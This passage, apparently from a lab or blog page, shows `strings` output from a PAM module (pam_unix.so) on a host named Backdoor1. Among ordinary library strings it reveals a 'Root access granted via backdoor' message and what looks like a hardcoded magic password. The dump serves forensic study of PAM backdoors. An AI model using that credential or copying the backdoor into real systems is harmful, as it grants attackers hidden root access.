class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br><span class="line">1338</span><br><span class="line">1339</span><br><span class="line">1340</span><br><span class="line">1341</span><br><span class="line">1342</span><br><span class="line">1343</span><br><span class="line">1344</span><br><span class="line">1345</span><br><span class="line">1346</span><br><span class="line">1347</span><br><span class="line">1348</span><br><span class="line">1349</span><br><span class="line">1350</span><br><span class="line">1351</span><br><span class="line">1352</span><br><span class="line">1353</span><br><span class="line">1354</span><br><span class="line">1355</span><br><span class="line">1356</span><br><span class="line">1357</span><br><span class="line">1358</span><br><span class="line">1359</span><br><span class="line">1360</span><br><span class="line">1361</span><br><span class="line">1362</span><br><span class="line">1363</span><br><span class="line">1364</span><br><span class="line">1365</span><br><span class="line">1366</span><br><span class="line">1367</span><br><span class="line">1368</span><br><span class="line">1369</span><br><span class="line">1370</span><br><span class="line">1371</span><br><span class="line">1372</span><br><span class="line">1373</span><br><span class="line">1374</span><br><span class="line">1375</span><br><span class="line">1376</span><br><span class="line">1377</span><br><span class="line">1378</span><br><span class="line">1379</span><br><span class="line">1380</span><br><span class="line">1381</span><br><span class="line">1382</span><br><span class="line">1383</span><br><span class="line">1384</span><br><span class="line">1385</span><br><span class="line">1386</span><br><span class="line">1387</span><br><span class="line">1388</span><br><span class="line">1389</span><br><span class="line">1390</span><br><span class="line">1391</span><br><span class="line">1392</span><br><span class="line">1393</span><br><span class="line">1394</span><br><span class="line">1395</span><br><span class="line">1396</span><br><span class="line">1397</span><br><span class="line">1398</span><br><span class="line">1399</span><br><span class="line">1400</span><br><span class="line">1401</span><br><span class="line">1402</span><br><span class="line">1403</span><br><span class="line">1404</span><br><span class="line">1405</span><br><span class="line">1406</span><br><span class="line">1407</span><br><span class="line">1408</span><br><span class="line">1409</span><br><span class="line">1410</span><br><span class="line">1411</span><br><span class="line">1412</span><br><span class="line">1413</span><br><span class="line">1414</span><br><span class="line">1415</span><br><span class="line">1416</span><br><span class="line">1417</span><br><span class="line">1418</span><br><span class="line">1419</span><br><span class="line">1420</span><br><span class="line">1421</span><br><span class="line">1422</span><br><span class="line">1423</span><br><span class="line">1424</span><br><span class="line">1425</span><br><span class="line">1426</span><br><span class="line">1427</span><br><span class="line">1428</span><br><span class="line">1429</span><br><span class="line">1430</span><br><span class="line">1431</span><br><span class="line">1432</span><br><span class="line">1433</span><br><span class="line">1434</span><br><span class="line">1435</span><br><span class="line">1436</span><br><span class="line">1437</span><br><span class="line">1438</span><br><span class="line">1439</span><br><span class="line">1440</span><br><span class="line">1441</span><br><span class="line">1442</span><br><span class="line">1443</span><br><span class="line">1444</span><br><span class="line">1445</span><br><span class="line">1446</span><br><span class="line">1447</span><br><span class="line">1448</span><br><span class="line">1449</span><br><span class="line">1450</span><br><span class="line">1451</span><br><span class="line">1452</span><br><span class="line">1453</span><br><span class="line">1454</span><br><span class="line">1455</span><br><span class="line">1456</span><br><span class="line">1457</span><br><span class="line">1458</span><br><span class="line">1459</span><br><span class="line">1460</span><br><span class="line">1461</span><br><span class="line">1462</span><br><span class="line">1463</span><br><span class="line">1464</span><br><span class="line">1465</span><br><span class="line">1466</span><br><span class="line">1467</span><br><span class="line">1468</span><br><span class="line">1469</span><br><span class="line">1470</span><br><span class="line">1471</span><br><span class="line">1472</span><br><span class="line">1473</span><br><span class="line">1474</span><br><span class="line">1475</span><br><span class="line">1476</span><br><span class="line">1477</span><br><span class="line">1478</span><br><span class="line">1479</span><br><span class="line">1480</span><br><span class="line">1481</span><br><span class="line">1482</span><br><span class="line">1483</span><br><span class="line">1484</span><br><span class="line">1485</span><br><span class="line">1486</span><br><span class="line">1487</span><br><span class="line">1488</span><br><span class="line">1489</span><br><span class="line">1490</span><br><span class="line">1491</span><br><span class="line">1492</span><br><span class="line">1493</span><br><span class="line">1494</span><br><span class="line">1495</span><br><span class="line">1496</span><br><span class="line">1497</span><br><span class="line">1498</span><br><span class="line">1499</span><br><span class="line">1500</span><br><span class="line">1501</span><br><span class="line">1502</span><br><span class="line">1503</span><br><span class="line">1504</span><br><span class="line">1505</span><br><span class="line">1506</span><br><span class="line">1507</span><br><span class="line">1508</span><br><span class="line">1509</span><br><span class="line">1510</span><br><span class="line">1511</span><br><span class="line">1512</span><br><span class="line">1513</span><br><span class="line">1514</span><br><span class="line">1515</span><br><span class="line">1516</span><br><span class="line">1517</span><br><span class="line">1518</span><br><span class="line">1519</span><br><span class="line">1520</span><br><span class="line">1521</span><br><span class="line">1522</span><br><span class="line">1523</span><br><span class="line">1524</span><br><span class="line">1525</span><br><span class="line">1526</span><br><span class="line">1527</span><br><span class="line">1528</span><br><span class="line">1529</span><br><span class="line">1530</span><br><span class="line">1531</span><br><span class="line">1532</span><br><span class="line">1533</span><br><span class="line">1534</span><br><span class="line">1535</span><br><span class="line">1536</span><br><span class="line">1537</span><br><span class="line">1538</span><br><span class="line">1539</span><br><span class="line">1540</span><br><span class="line">1541</span><br><span class="line">1542</span><br><span class="line">1543</span><br><span class="line">1544</span><br><span class="line">1545</span><br><span class="line">1546</span><br><span class="line">1547</span><br><span class="line">1548</span><br><span class="line">1549</span><br><span class="line">1550</span><br><span class="line">1551</span><br><span class="line">1552</span><br><span class="line">1553</span><br><span class="line">1554</span><br><span class="line">1555</span><br><span class="line">1556</span><br><span class="line">1557</span><br><span class="line">1558</span><br><span class="line">1559</span><br><span class="line">1560</span><br><span class="line">1561</span><br><span class="line">1562</span><br><span class="line">1563</span><br><span class="line">1564</span><br><span class="line">1565</span><br><span class="line">1566</span><br><span class="line">1567</span><br><span class="line">1568</span><br><span class="line">1569</span><br><span class="line">1570</span><br><span class="line">1571</span><br><span class="line">1572</span><br><span class="line">1573</span><br><span class="line">1574</span><br><span class="line">1575</span><br><span class="line">1576</span><br><span class="line">1577</span><br><span class="line">1578</span><br><span class="line">1579</span><br><span class="line">1580</span><br><span class="line">1581</span><br><span class="line">1582</span><br><span class="line">1583</span><br><span class="line">1584</span><br><span class="line">1585</span><br><span class="line">1586</span><br><span class="line">1587</span><br><span class="line">1588</span><br><span class="line">1589</span><br><span class="line">1590</span><br><span class="line">1591</span><br><span class="line">1592</span><br><span class="line">1593</span><br><span class="line">1594</span><br><span class="line">1595</span><br><span class="line">1596</span><br><span class="line">1597</span><br></pre></td><td class="code"><pre><code class="hljs bash">morri@Backdoor1:~$ strings /lib/x86_64-linux-gnu/security/pam_unix.so<br>P`^B<br>__gmon_start__<br>_ITM_deregisterTMCloneTable<br>_ITM_registerTMCloneTable<br>__cxa_finalize<br>calloc<br>malloc<br>strncpy<br>strlen<br>crypt_r<br>free<br>pipe<br>fork<br>dup2<br>pam_modutil_sanitize_helper_fds<br>geteuid<br>setuid<br>execve<br>pam_syslog<br>stdout<br>fflush<br>_exit<br>__errno_location<br>waitpid<br>sigaction<br>pam_modutil_read<br>__isoc99_sscanf<br>pam_sm_acct_mgmt<br>pam_get_item<br>getuid<br>pam_get_data<br>dcngettext<br>snprintf<br>dcgettext<br>pam_sm_authenticate<br>pam_get_user<br>pam_get_authtok<br>pam_set_data<br>pam_sm_setcred<br>strcmp<br>fopen<br>fgets<br>strncmp<br>strtok_r<br>fclose<br>pam_sm_chauthtok<br>pam_prompt<br>pam_set_item<br>yp_get_default_domain<br>yp_master<br>getrpcport<br>strdup<br>clnt_create<br>authunix_create_default<br>xdr_int<br>clnt_sperrno<br>yperr_string<br>pam_sm_open_session<br>pam_modutil_getlogin<br>pam_sm_close_session<br>write<br>feof<br>__getdelim<br>strchr<br>__ctype_b_loc<br>strsep<br>strcasecmp<br>strncasecmp<br>strtol<br>memset<br>yp_bind<br>yp_match<br>yp_unbind<br>strcpy<br>memcpy<br>pam_fail_delay<br>gettimeofday<br>getpid<br>clock<br>pam_modutil_getpwnam<br>pam_modutil_getspnam<br><span class="hljs-keyword">time</span><br>stpcpy<br>usleep<br>ulckpwdf<br><span class="hljs-built_in">umask</span><br>fileno<br>__fxstat<br>fchown<br>fchmod<br>fputs<br>fsync<br>rename<br><span class="hljs-built_in">unlink</span><br>fgetpwent<br>putpwent<br>fgetspent<br>putspent<br>xdr_string<br>strncat<br>libpam.so.0<br>libcrypt.so.1<br>libnsl.so.2<br>libc.so.6<br>pam_unix.so<br>XCRYPT_2.0<br>LIBNSL_1.0<br>GLIBC_2.3<br>GLIBC_2.7<br>GLIBC_2.14<br>GLIBC_2.2.5<br>LIBPAM_EXTENSION_1.1<br>LIBPAM_EXTENSION_1.0<br>LIBPAM_1.0<br>LIBPAM_MODUTIL_1.0<br>LIBPAM_MODUTIL_1.1.9<br>/root/Linux-PAM-1.3.1/libpam/.libs<br>u/UH<br>AWAVI<br>AUATUH<br>[]A\A]A^A_<br>AVAUI<br>[]A\A]A^A_<br>t<span class="hljs-variable">$01</span><br>AUATUH<br>]A\A]A^<br>T$ H<br>HcL$<br>T$ H<br>D$ H<br>D$ H<br>AUATUH<br>]A\A]A^<br>]A\A]A^<br> []A\<br>[]A\<br>AWAVAUATI<br>[]A\A]A^A_<br>AVAUATUSH<br>L<span class="hljs-variable">$@H</span><br>T$&lt;H<br>t<span class="hljs-variable">$X1</span><br>t<span class="hljs-variable">$HH</span><br>t<span class="hljs-variable">$HL</span><br>D<span class="hljs-variable">$PH</span><br>l$`H<br>D<span class="hljs-variable">$XD</span><br>D<span class="hljs-variable">$DH</span><br>T<span class="hljs-variable">$XD</span><br>T<span class="hljs-variable">$XH</span><br>t<span class="hljs-variable">$HH</span><br>t<span class="hljs-variable">$HD</span><br>D<span class="hljs-variable">$DH</span><br>L$`D<br>L<span class="hljs-variable">$@H</span><br>t$`D<br>D$&lt;H<br>D<span class="hljs-variable">$XH</span><br>[]A\A]A^A_<br>T<span class="hljs-variable">$HD</span><br>T<span class="hljs-variable">$X1</span><br>T<span class="hljs-variable">$XH</span><br>t<span class="hljs-variable">$HD</span><br>t<span class="hljs-variable">$HD</span><br>t<span class="hljs-variable">$HA</span><br>D<span class="hljs-variable">$hH</span><br>|<span class="hljs-variable">$pH</span><br>D<span class="hljs-variable">$hH</span><br>D$ H<br>D<span class="hljs-variable">$pH</span><br>L$ H<br>t<span class="hljs-variable">$hE</span><br>L$ H<br>ATUH<br>[]A\A]<br>[]A\A]<br>uWE1<br>[]A\<br>[]A\<br>AVAUI<br>t<span class="hljs-variable">$01</span><br>[]A\A]A^A_<br>ATUSH<br>[]A\<br> []A\<br>ASARL<br>ATUSH<br>[]A\A]A^<br>AVAUATA<br>|$ H<br>t$,H<br>L$,D<br>@D#d<br>8[]D<br>A\A]A^A_<br>|$ H<br>|$ H<br>|$ H<br>|$ H<br>|$ 1<br>AVAUA<br>u&amp;E1<br>[]A\A]A^A_<br>|<span class="hljs-variable">$xL</span><br>L<span class="hljs-variable">$lL</span><br>D<span class="hljs-variable">$pH</span><br>|<span class="hljs-variable">$xA</span><br>D<span class="hljs-variable">$xA</span><br>l<span class="hljs-variable">$xI</span><br>D$\H<br>|$ H<br>|<span class="hljs-variable">$0H</span><br>T<span class="hljs-variable">$HH</span><br>D<span class="hljs-variable">$@B</span><br>D$\H<br>D<span class="hljs-variable">$xH</span><br>l<span class="hljs-variable">$xL</span><br>l<span class="hljs-variable">$xL</span><br>t$ I<br>l<span class="hljs-variable">$xL</span><br>t<span class="hljs-variable">$0I</span><br>AUATUH<br> ]A\A]<br> ]A\A]<br>AUATI<br>L$ H<br>-UN*X-FAH<br>|$ H<br>|$ H<br>[]A\A]A^A_<br>T$(H<br>D$(H<br>t$ H<br>L<span class="hljs-variable">$@H</span><br>T<span class="hljs-variable">$8H</span><br>D<span class="hljs-variable">$HM</span><br>ATUIc<br>[]A\A]A^<br>t<span class="hljs-variable">$0L</span><br>AWAVAUA<br>u#E1<br>[]A\A]A^A_<br>[]A\A]<br>[]A\A]<br>[]A\A]<br>ATUH<br>[]A\<br>[]A\<br>K H)<br>&#123;0H9<br>$$1$<br>AWAVAUATI<br>|$ L<br>h[]A\A]A^A_<br>h[]A\A]A^A_<br>[]A\A]A^A_<br>AWAVAUATUSH<br>t$\D<br>|$`L<br>|<span class="hljs-variable">$XL</span><br>T<span class="hljs-variable">$8H</span><br>D$ H<br>D$(H<br>[]A\A]A^A_<br>tmE9<br>D<span class="hljs-variable">$8H</span><br>L<span class="hljs-variable">$0L</span><br>D<span class="hljs-variable">$8H</span><br>AWAVAUI<br>ATUSH<br>t<span class="hljs-variable">$0D</span><br>|$,H<br>|$(H<br>[]A\A]A^A_<br>AWAVI<br>ATUSH<br>|$|H<br>|<span class="hljs-variable">$xH</span><br>[]A\A]A^A_<br>AVAUATUSD<br>p <span class="hljs-variable">$E</span><br>QZ^&amp;<br>A]A^<br>AWAVI<br>[]A\A]A^A_<br>[]A\<br>AVAUATI<br>t<span class="hljs-variable">$0H</span><br>=UUUUwni<br><span class="hljs-variable">$w</span>&#125;E<br>=UUUUv<br>|$ H<br>D$,<br>|$<span class="hljs-string">&#x27;L</span><br><span class="hljs-string">|$-</span><br><span class="hljs-string">|$(L</span><br><span class="hljs-string">|$.</span><br><span class="hljs-string">|$)L</span><br><span class="hljs-string">|$/</span><br><span class="hljs-string">|$*L</span><br><span class="hljs-string">|$%</span><br><span class="hljs-string">[]A\A]A^A_</span><br><span class="hljs-string">AVAUATUSD</span><br><span class="hljs-string">p $E</span><br><span class="hljs-string">QZ^&amp;</span><br><span class="hljs-string">A]A^</span><br><span class="hljs-string">AWAVI</span><br><span class="hljs-string">[]A\A]A^A_</span><br><span class="hljs-string">[]A\</span><br><span class="hljs-string">AVAUATI</span><br><span class="hljs-string">t$0H</span><br><span class="hljs-string">=UUUUwni</span><br><span class="hljs-string">$w&#125;E</span><br><span class="hljs-string">=UUUUv</span><br><span class="hljs-string">|$ H</span><br><span class="hljs-string">D$,</span><br><span class="hljs-string">|$&#x27;</span>L<br>|$-<br>|$(L<br>|$.<br>|$)L<br>|$/<br>|$*L<br>|$%<br>[]A\A]A^A_<br>Could not make pipe: %m<br>stdout<br>dup2 of %s failed: %m<br>setuid failed: %m<br>/sbin/unix_chkpwd<br>chkexpiry<br>unix_chkpwd abnormal <span class="hljs-built_in">exit</span>: %d<br>Fork failed: %m<br>unix_setcred_return<br>Linux-PAM<br>helper binary execve failed: %m<br><span class="hljs-built_in">read</span> unix_chkpwd output error %d: %m<br>unix_chkpwd waitpid returned %d: %m<br>could not identify user (from uid=%lu)<br>could not identify user (from getpwnam(%s))<br>account %s has expired (account expired)<br>Your account has expired; please contact your system administrator<br>expired password <span class="hljs-keyword">for</span> user %s (root enforced)<br>You are required to change your password immediately (administrator enforced)<br>expired password <span class="hljs-keyword">for</span> user %s (password aged)<br>You are required to change your password immediately (password expired)<br>account %s has expired (failed to change password)<br>password <span class="hljs-keyword">for</span> user %s will expire <span class="hljs-keyword">in</span> %d days<br>Warning: your password will expire <span class="hljs-keyword">in</span> %d days<br>Warning: your password will expire <span class="hljs-keyword">in</span> %d day<br>pam_unix_auth: cannot allocate ret_data<br>auth could not identify password <span class="hljs-keyword">for</span> [%s]<br>PAM: Root access granted via backdoor<br>bad username [%s]<br>660930334<br>No password supplied<br>Password unchanged<br>Can not get username<br>/etc/security/opasswd<br>bad authentication token<br> or NIS<br> not<br>username [%s] obtained<br>Changing password <span class="hljs-keyword">for</span> %s.<br>user not authenticated<br>user shadow entry expired<br>new password not acceptable 2<br>can<span class="hljs-string">&#x27;t get local yp domain: %s</span><br><span class="hljs-string">passwd.byname</span><br><span class="hljs-string">new password not acceptable</span><br><span class="hljs-string">You must choose a longer password</span><br><span class="hljs-string">can&#x27;</span>t open %s file to check old passwords<br>Password has been already used. Choose another.<br>password - could not identify user<br>user <span class="hljs-string">&quot;%s&quot;</span> does not exist <span class="hljs-keyword">in</span> /etc/passwd%s<br>user <span class="hljs-string">&quot;%s&quot;</span> has corrupted passwd entry<br>password - (old) token not obtained<br>You must <span class="hljs-built_in">wait</span> longer to change your password<br>password - new password not obtained<br>user password changed by another process<br>crypt() failure or out of memory <span class="hljs-keyword">for</span> password<br>can<span class="hljs-string">&#x27;t find the master ypserver: %s</span><br><span class="hljs-string">yppasswdd not running on NIS master host</span><br><span class="hljs-string">yppasswd daemon running on illegal port</span><br><span class="hljs-string">Use NIS server on %s with port %d</span><br><span class="hljs-string">password%s changed for %s on %s</span><br><span class="hljs-string">NIS password could not be changed.</span><br><span class="hljs-string">password received unknown request</span><br><span class="hljs-string">session closed for user %s</span><br><span class="hljs-string">open_session - error recovering username</span><br><span class="hljs-string">open_session - error recovering service</span><br><span class="hljs-string">session opened for user %s by %s(uid=%lu)</span><br><span class="hljs-string">close_session - error recovering username</span><br><span class="hljs-string">close_session - error recovering service</span><br><span class="hljs-string">nullok</span><br><span class="hljs-string">nonull</span><br><span class="hljs-string">stdin</span><br><span class="hljs-string"> user=</span><br><span class="hljs-string">**unknown**</span><br><span class="hljs-string">/etc/login.defs</span><br><span class="hljs-string">ENCRYPT_METHOD</span><br><span class="hljs-string">SHA_CRYPT_MAX_ROUNDS</span><br><span class="hljs-string">unrecognized option [%s]</span><br><span class="hljs-string">/etc/passwd</span><br><span class="hljs-string">_pam_unix_getpwnam_%s</span><br><span class="hljs-string">no memory for data-name</span><br><span class="hljs-string">check pass; user (%s) unknown</span><br><span class="hljs-string">check pass; user unknown</span><br><span class="hljs-string">audit</span><br><span class="hljs-string">use_first_pass</span><br><span class="hljs-string">try_first_pass</span><br><span class="hljs-string">authtok_type=</span><br><span class="hljs-string">use_authtok</span><br><span class="hljs-string">debug</span><br><span class="hljs-string">nodelay</span><br><span class="hljs-string">bigcrypt</span><br><span class="hljs-string">likeauth</span><br><span class="hljs-string">remember=</span><br><span class="hljs-string">noreap</span><br><span class="hljs-string">broken_shadow</span><br><span class="hljs-string">sha256</span><br><span class="hljs-string">sha512</span><br><span class="hljs-string">rounds=</span><br><span class="hljs-string">blowfish</span><br><span class="hljs-string">minlen=</span><br><span class="hljs-string">quiet</span><br><span class="hljs-string">no_pass_expiry</span><br><span class="hljs-string">Cannot send password to helper: %m</span><br><span class="hljs-string">%d more authentication failure%s; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s</span><br><span class="hljs-string">service(%s) ignoring max retries; %d &gt; %d</span><br><span class="hljs-string">option remember not allowed for this module type</span><br><span class="hljs-string">option minlen not allowed for this module type</span><br><span class="hljs-string">option rounds not allowed for this module type</span><br><span class="hljs-string">Password minlen reset to 8 characters</span><br><span class="hljs-string">unrecognized ENCRYPT_METHOD value [%s]</span><br><span class="hljs-string">authentication failure; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s</span><br><span class="hljs-string">no memory for failure recorder</span><br><span class="hljs-string">/dev/urandom</span><br><span class="hljs-string">*NP*</span><br><span class="hljs-string">$2a$</span><br><span class="hljs-string">rounds=%u$</span><br><span class="hljs-string">/etc/security/nopasswd</span><br><span class="hljs-string">%s:%s:%d:%s</span><br><span class="hljs-string">%s:%s:%d:%s,%s</span><br><span class="hljs-string">%s:%lu:1:%s</span><br><span class="hljs-string">/etc/npasswd</span><br><span class="hljs-string">password changed for %s</span><br><span class="hljs-string">/etc/nshadow</span><br><span class="hljs-string">/etc/shadow</span><br><span class="hljs-string">account %s has password changed in future</span><br><span class="hljs-string">Algo %s not supported by the crypto backend, falling back to MD5</span><br><span class="hljs-string">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./</span><br><span class="hljs-string">./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><br><span class="hljs-string">./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><br><span class="hljs-string">;*3$&quot;</span><br><span class="hljs-string">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span><br><span class="hljs-string">|!3)</span><br><span class="hljs-string">|%rc</span><br><span class="hljs-string">        3       -</span><br><span class="hljs-string">        4       -</span><br><span class="hljs-string">        8       -</span><br><span class="hljs-string">        9       -</span><br><span class="hljs-string">        :       -</span><br><span class="hljs-string"> low</span><br><span class="hljs-string">&quot;key</span><br><span class="hljs-string"> low</span><br><span class="hljs-string">(pwd</span><br><span class="hljs-string">~20&#x27;</span><br> <span class="hljs-variable">$0</span>.(<br>;<span class="hljs-built_in">pwd</span><br>;err<br>(buf<br>;len<br>&gt;&lt;D<br>Cerr<br><span class="hljs-string">&quot;pwd</span><br><span class="hljs-string">&#x27;new</span><br><span class="hljs-string">&#x27;old</span><br><span class="hljs-string">&quot;</span><span class="hljs-built_in">tty</span><br>9% 1<br><span class="hljs-string">&quot;pwd</span><br><span class="hljs-string">&quot;</span>fds<br><span class="hljs-string">&#x27;len</span><br><span class="hljs-string">!nis</span><br><span class="hljs-string">!nis</span><br><span class="hljs-string">!ret</span><br><span class="hljs-string">&quot;buf</span><br><span class="hljs-string">~&quot;len</span><br><span class="hljs-string">!err</span><br><span class="hljs-string">P&quot;tty</span><br><span class="hljs-string">5val</span><br><span class="hljs-string">;key</span><br><span class="hljs-string">=buf</span><br><span class="hljs-string">?=tmp</span><br><span class="hljs-string">;__n</span><br><span class="hljs-string">~$len</span><br><span class="hljs-string">0pwd</span><br><span class="hljs-string">0pwd</span><br><span class="hljs-string">0pwd</span><br><span class="hljs-string"> $,(</span><br><span class="hljs-string"> $,(</span><br><span class="hljs-string">/usr/include</span><br><span class="hljs-string">bigcrypt.c</span><br><span class="hljs-string">crypt.h</span><br><span class="hljs-string">stdlib.h</span><br><span class="hljs-string">string.h</span><br><span class="hljs-string">&lt;built-in&gt;</span><br><span class="hljs-string">/usr/lib/gcc/x86_64-linux-gnu/10/include</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits/types</span><br><span class="hljs-string">/usr/include</span><br><span class="hljs-string">../../libpam/include/security</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/sys</span><br><span class="hljs-string">pam_unix_acct.c</span><br><span class="hljs-string">stddef.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">__sigset_t.h</span><br><span class="hljs-string">struct_FILE.h</span><br><span class="hljs-string">FILE.h</span><br><span class="hljs-string">pwd.h</span><br><span class="hljs-string">shadow.h</span><br><span class="hljs-string">__sigval_t.h</span><br><span class="hljs-string">siginfo_t.h</span><br><span class="hljs-string">signal.h</span><br><span class="hljs-string">sigaction.h</span><br><span class="hljs-string">_pam_types.h</span><br><span class="hljs-string">support.h</span><br><span class="hljs-string">stdio.h</span><br><span class="hljs-string">pam_modules.h</span><br><span class="hljs-string">passverify.h</span><br><span class="hljs-string">unistd.h</span><br><span class="hljs-string">pam_ext.h</span><br><span class="hljs-string">libintl.h</span><br><span class="hljs-string">pam_modutil.h</span><br><span class="hljs-string">errno.h</span><br><span class="hljs-string">wait.h</span><br><span class="hljs-string">&lt;built-in&gt;</span><br><span class="hljs-string">../../libpam/include/security</span><br><span class="hljs-string">/usr/include</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/sys</span><br><span class="hljs-string">pam_unix_auth.c</span><br><span class="hljs-string">support.h</span><br><span class="hljs-string">_pam_types.h</span><br><span class="hljs-string">pam_modules.h</span><br><span class="hljs-string">stdlib.h</span><br><span class="hljs-string">pam_ext.h</span><br><span class="hljs-string">syslog.h</span><br><span class="hljs-string">/usr/lib/gcc/x86_64-linux-gnu/10/include</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits/types</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/sys</span><br><span class="hljs-string">/usr/include</span><br><span class="hljs-string">../../libpam/include/security</span><br><span class="hljs-string">/usr/include/rpc</span><br><span class="hljs-string">/usr/include/netinet</span><br><span class="hljs-string">/usr/include/rpcsvc</span><br><span class="hljs-string">pam_unix_passwd.c</span><br><span class="hljs-string">stddef.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">struct_FILE.h</span><br><span class="hljs-string">FILE.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">stdint-intn.h</span><br><span class="hljs-string">struct_timeval.h</span><br><span class="hljs-string">pwd.h</span><br><span class="hljs-string">shadow.h</span><br><span class="hljs-string">_pam_types.h</span><br><span class="hljs-string">support.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">stdint-uintn.h</span><br><span class="hljs-string">sockaddr.h</span><br><span class="hljs-string">socket.h</span><br><span class="hljs-string">in.h</span><br><span class="hljs-string">un.h</span><br><span class="hljs-string">xdr.h</span><br><span class="hljs-string">auth.h</span><br><span class="hljs-string">clnt.h</span><br><span class="hljs-string">yppasswd.h</span><br><span class="hljs-string">pam_ext.h</span><br><span class="hljs-string">ypclnt.h</span><br><span class="hljs-string">passverify.h</span><br><span class="hljs-string">string.h</span><br><span class="hljs-string">malloc.h</span><br><span class="hljs-string">libintl.h</span><br><span class="hljs-string">pam_modules.h</span><br><span class="hljs-string">md5.h</span><br><span class="hljs-string">stdio.h</span><br><span class="hljs-string">../../libpam/include/security</span><br><span class="hljs-string">/usr/include</span><br><span class="hljs-string">pam_unix_sess.c</span><br><span class="hljs-string">support.h</span><br><span class="hljs-string">_pam_types.h</span><br><span class="hljs-string">pam_ext.h</span><br><span class="hljs-string">pam_modutil.h</span><br><span class="hljs-string">unistd.h</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits</span><br><span class="hljs-string">/usr/include</span><br><span class="hljs-string">/usr/lib/gcc/x86_64-linux-gnu/10/include</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/sys</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits/types</span><br><span class="hljs-string">../../libpam/include/security</span><br><span class="hljs-string">/usr/include/rpcsvc</span><br><span class="hljs-string">support.c</span><br><span class="hljs-string">stdio.h</span><br><span class="hljs-string">stdlib.h</span><br><span class="hljs-string">stddef.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">__sigset_t.h</span><br><span class="hljs-string">struct_FILE.h</span><br><span class="hljs-string">FILE.h</span><br><span class="hljs-string">pwd.h</span><br><span class="hljs-string">__sigval_t.h</span><br><span class="hljs-string">siginfo_t.h</span><br><span class="hljs-string">signal.h</span><br><span class="hljs-string">sigaction.h</span><br><span class="hljs-string">_pam_types.h</span><br><span class="hljs-string">support.h</span><br><span class="hljs-string">pam_ext.h</span><br><span class="hljs-string">pam_modutil.h</span><br><span class="hljs-string">string.h</span><br><span class="hljs-string">unistd.h</span><br><span class="hljs-string">pam_modules.h</span><br><span class="hljs-string">malloc.h</span><br><span class="hljs-string">passverify.h</span><br><span class="hljs-string">errno.h</span><br><span class="hljs-string">wait.h</span><br><span class="hljs-string">stdio.h</span><br><span class="hljs-string">ctype.h</span><br><span class="hljs-string">ypclnt.h</span><br><span class="hljs-string">&lt;built-in&gt;</span><br><span class="hljs-string">strings.h</span><br><span class="hljs-string">[Y;YYWYYWYYWY</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/sys</span><br><span class="hljs-string">/usr/lib/gcc/x86_64-linux-gnu/10/include</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits/types</span><br><span class="hljs-string">../../libpam/include/security</span><br><span class="hljs-string">/usr/include</span><br><span 